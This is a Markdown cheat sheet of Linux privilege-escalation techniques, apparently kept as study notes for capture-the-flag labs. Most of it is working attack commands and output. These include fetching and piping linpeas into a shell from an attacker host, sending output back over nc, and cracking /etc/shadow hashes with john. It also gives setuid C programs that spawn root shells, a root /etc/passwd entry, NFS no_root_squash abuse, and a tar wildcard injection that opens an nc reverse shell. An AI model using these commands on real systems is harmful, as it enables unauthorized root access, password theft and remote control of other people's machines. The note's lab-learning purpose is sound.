# Linux

## Methodology

- Scripts
    - LinEnum - [Link](https://github.com/rebootuser/LinEnum)
    - LinpPeas - [Link](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

```console
# Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

- sudo -l

Take a look at the variables like **LD_PRELOAD**
Take a look which commands you can run as sudo

```console
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl   
```



## Unshadow Passwd & Shadow

You need to download 2 files. /etc/passwd & /etc/shadow

```console
$ unshadow <passwd> <shadow> > hashes.txt
```

Then crack it with john

```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt new.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (karen)
Password1        (user2)
test123          (gerryconway)
3g 0:00:00:13 DONE (2022-02-19 19:18) 0.2155g/s 1268p/s 1783c/s 1783C/s 111292..ellie123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Cron

read cron jobs with `/etc/crontab`

For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature

Be sure the file has `chmod +x`
## Environment var

Show PATH var
```console
echo $PATH
```

Add direcotry to PATH var
```console
export PATH=/tmp:$PATH
```

Find writeble folders
```console
$ find / -writable 2>/dev/null |cut -d "/" -f 2 | sort -u
```

```console
#!/bin/bash
/bin/bash
```
Set chmod 777

```c
#Spawn Bash C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main (void) {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
        return 0;
}
```
set chmod x+s

## SUID

Compare executables with [GTFOBins](https://gtfobins.github.io/)

Find SUID files:

```console
$ find / -perm -u=s -type f 2>/dev/null
```

## Writeble files

**/etc/passwd**

Format: `test:x:0:0:root:/root:/bin/bash`

1. Username: It is used when user logs in. It should be between 1 and 32 characters in length.
2. Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".

3. User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. Group ID (GID): The primary group ID (stored in /etc/group file)
5. User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

```console
New entry
$ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

## Capabilities

Find capabilities:

```console
$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

Look at [GTFOBins](https://gtfobins.github.io/) for leverage

## NFS

Check /etc/exports for "no_root_squash":
```console
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

Look for mountable shares:
```console
$ showmount -e 10.10.193.66
Export list for 10.10.193.66:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

Mount one shared dir with "no_root_squash":
```console
$ mkdir /tmp/shared
$ sudo mount -o rw 10.10.193.66:/home/backup /tmp/shared/
```

Create file inside shared:
```c
int main(){
        setgid(0);
        setuid(0);
        system("/bin/bash");
        return 0;
}
```
Compile the code:
```console
$ gcc root.c -o nfs -w

#ls -la
total 28
drw-r--r-- 2 root root  4096 20. Feb 12:26 .
drwxrwxrwt 1 root root   822 20. Feb 12:26 ..
-rwxr-xr-x 1 root root 16712 20. Feb 12:26 nfs
-rw-r--r-- 1 root root    71 20. Feb 12:26 root.c

$ chmod +s root
$ ls -la
total 28
drwxr-xr-x 2 root root  4096 20. Feb 12:35 .
drwxrwxrwt 1 root root   834 20. Feb 12:35 ..
-rwsr-sr-x 1 root root 16712 20. Feb 12:35 root
-rw-r--r-- 1 root root    99 20. Feb 12:33 root.c
```

## tar wildcard

```console
$ echo "mkfifo /tmp/ahikccu; nc VPN IP 1337 0</tmp/ahikccu | /bin/sh >/tmp/ahikccu 2>&1; rm /tmp/ahikccu" > shell.sh
$ chmod 777 shell.sh
$ echo "" > "--checkpoint-action=exec=sh shell.sh"
$ echo "" > --checkpoint=1
```

start nc listener

```console
$ sudo /opt/backups/backup.sh
```